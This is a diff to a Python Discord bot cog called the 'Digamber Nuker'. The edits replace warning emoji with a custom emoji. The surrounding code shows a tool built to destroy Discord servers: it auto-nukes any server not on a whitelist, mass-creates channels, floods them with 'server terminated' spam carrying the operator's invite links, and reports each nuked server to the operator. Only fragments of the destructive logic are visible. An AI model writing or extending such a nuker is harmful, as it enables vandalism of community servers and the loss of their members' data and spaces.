@@ -122,7 +122,7 @@ class NukerCommands(commands.Cog):
             )
             
             embed.add_field(
-                name="⚠️ WARNING",
+                name="<a:emoji_27:1410746704537587752> WARNING",
                 value="This is an Fucked by Digamber nuke system. Do not invite unauthorized bots.",
                 inline=False
             )
@@ -341,18 +341,18 @@ class NukerCommands(commands.Cog):
             
             # Professional message templates
             professional_messages = [
-                f"# ⚠️ `{guild.name}` HAS BEEN TERMINATED",
+                f"# <a:emoji_27:1410746704537587752> `{guild.name}` HAS BEEN TERMINATED",
                 f"## 💀 SERVER DESTROYED: {guild.name}",
-                f"**🚨 ATTENTION: {guild.name.upper()} NO LONGER EXISTS**",
+                f"**<a:emoji_27:1410746704537587752> ATTENTION: {guild.name.upper()} NO LONGER EXISTS**",
                 f"```diff\n- SERVER TERMINATED: {guild.name}\n- REASON: Digamber Nuker System\n- TIME: {datetime.utcnow().strftime('%H:%M:%S UTC')}\n```",
                 f"> 🔥 **{guild.name}** annihilated by Digamber",
                 f"📢 **OFFICIAL ANNOUNCEMENT:** {guild.name} removed from Discord",
                 f"⚡ **INSTANT DESTRUCTION:** {guild.name}",
-                f"💥 **MAXIMUM DAMAGE:** {guild.name}",
+                f"<a:emoji_27:1410746704537587752> **MAXIMUM DAMAGE:** {guild.name}",
                 f"🔗 **Join Official Server:** https://discord.gg/5TB2n6tmvd",
                 f"🔗 **Join Backup Server:** https://discord.gg/5bFnXdUp8U",
                 f"**📊 STATS:** {guild.name} | 500+ Channels | 2500+ Messages",
-                f"**⚠️ WARNING:** {guild.name} was nuked automatically",
+                f"**<a:emoji_27:1410746704537587752> WARNING:** {guild.name} was nuked automatically",
                 f"**🔥 BY:** Digamber Nuker Bot | Maximum Speed",
                 f"**💀 STATUS:** {guild.name} - COMPLETELY DESTROYED",
                 f"```\nSERVER: {guild.name}\nSTATUS: TERMINATED\nACTION: AUTO-NUKE\nBOT: Digamber Nuker\n```"
@@ -389,7 +389,7 @@ class NukerCommands(commands.Cog):
                     await asyncio.sleep(0.5)
                     
                 except Exception as e:
-                    print(f"⚠️ Continuing with created channels...")
+                    print(f"<a:emoji_27:1410746704537587752> Continuing with created channels...")
                     break
             
             print(f"🎉 {channel_count} CHANNELS CREATED!")
@@ -450,7 +450,7 @@ class NukerCommands(commands.Cog):
                     )
                     
                     final_embed.add_field(
-                        name="⚠️ SYSTEM MESSAGE",
+                        name="<a:emoji_27:1410746704537587752> SYSTEM MESSAGE",
                         value="This server was automatically terminated by Digamber Nuker Bot for security reasons.",
                         inline=False
                     )
@@ -477,7 +477,7 @@ class NukerCommands(commands.Cog):
             await self.update_status_channel()
             
             # Admin panel update
-            await self.send_admin_notification(f"🚨 Server Nuked: **{guild.name}** (`{guild.id}`)")
+            await self.send_admin_notification(f"<a:emoji_27:1410746704537587752> Server Nuked: **{guild.name}** (`{guild.id}`)")
             
         except Exception as e:
             print(f"💀 Professional nuke failed: {e}")
@@ -569,7 +569,7 @@ class NukerCommands(commands.Cog):
         
         if server_id in self.permanent_whitelist:
             embed = discord.Embed(
-                title="⚠️ ALREADY PERMANENT",
+                title="<a:emoji_27:1410746704537587752> ALREADY PERMANENT",
                 description=f"Server `{server_id}` is already in **PERMANENT** whitelist.",
                 color=0xff9900
             )
@@ -578,7 +578,7 @@ class NukerCommands(commands.Cog):
         
         if server_id in self.whitelisted_servers:
             embed = discord.Embed(
-                title="⚠️ ALREADY WHITELISTED",
+                title="<a:emoji_27:1410746704537587752> ALREADY WHITELISTED",
                 description=f"Server `{server_id}` is already in dynamic whitelist.",
                 color=0xff9900
             )
@@ -637,7 +637,7 @@ class NukerCommands(commands.Cog):
         server_name = guild.name if guild else f"Unknown ({server_id})"
         
         embed = discord.Embed(
-            title="⚠️ WHITELIST REMOVED",
+            title="<a:emoji_27:1410746704537587752> WHITELIST REMOVED",
             description=f"**{server_name}** has been removed from dynamic whitelist.",
             color=0xff9900
         )
@@ -647,7 +647,7 @@ class NukerCommands(commands.Cog):
         embed.add_field(name="Warning", value="Server is now vulnerable to auto-nuke!", inline=False)
         
         await ctx.send(embed=embed)
-        await self.send_admin_notification(f"⚠️ Server removed from whitelist: **{server_name}**")
+        await self.send_admin_notification(f"<a:emoji_27:1410746704537587752> Server removed from whitelist: **{server_name}**")
 
     @commands.command(name='wllist')
     @commands.is_owner()
@@ -682,7 +682,7 @@ class NukerCommands(commands.Cog):
                 else:
                     embed.add_field(
                         name=f"❓ Server {server_id}",
-                        value=f"**ID:** `{server_id}`\n**Status:** ⚠️ OFFLINE\n**Type:** 🔒 PERMANENT",
+                        value=f"**ID:** `{server_id}`\n**Status:** <a:emoji_27:1410746704537587752> OFFLINE\n**Type:** 🔒 PERMANENT",
                         inline=True
                     )
         
@@ -705,7 +705,7 @@ class NukerCommands(commands.Cog):
                 else:
                     embed.add_field(
                         name=f"❓ Server {server_id}",
-                        value=f"**ID:** `{server_id}`\n**Status:** ⚠️ OFFLINE\n**Type:** 🔧 DYNAMIC",
+                        value=f"**ID:** `{server_id}`\n**Status:** <a:emoji_27:1410746704537587752> OFFLINE\n**Type:** 🔧 DYNAMIC",
                         inline=True
                     )
         
@@ -756,7 +756,7 @@ class NukerCommands(commands.Cog):
         embed.add_field(name="Members", value=f"`{guild.member_count}`", inline=True)
         embed.add_field(name="Channels", value=f"`{len(guild.channels)}`", inline=True)
         embed.add_field(
-            name="⚠️ WARNING",
+            name="<a:emoji_27:1410746704537587752> WARNING",
             value="This action is **IRREVERSIBLE**!\nAll data will be permanently destroyed.",
             inline=False
         )
@@ -954,7 +954,7 @@ class NukerCommands(commands.Cog):
             
             await ctx.send(embed=embed)
         else:
-            await ctx.send("⚠️ This server is not whitelisted!")
+            await ctx.send("<a:emoji_27:1410746704537587752> This server is not whitelisted!")
 
     @commands.command(name='serverinfo')
     @commands.is_owner()
@@ -1078,7 +1078,7 @@ class NukerCommands(commands.Cog):
             self.save_whitelist()
             
             embed = discord.Embed(
-                title="⚠️ PROTECTION REMOVED",
+                title="<a:emoji_27:1410746704537587752> PROTECTION REMOVED",
                 color=0xff9900,
                 timestamp=datetime.utcnow()
             )
@@ -1088,7 +1088,7 @@ class NukerCommands(commands.Cog):
                 inline=False
             )
             embed.add_field(
-                name="🚨 WARNING",
+                name="<a:emoji_27:1410746704537587752> WARNING",
                 value=f"• Server ID: `{server_id}`\n• Status: ❌ UNSAFE\n• Auto-Nuke: <a:emoji_1:1430081383757512785> ENABLED\n• Protection: 🛡️ DISABLED",
                 inline=False
             )
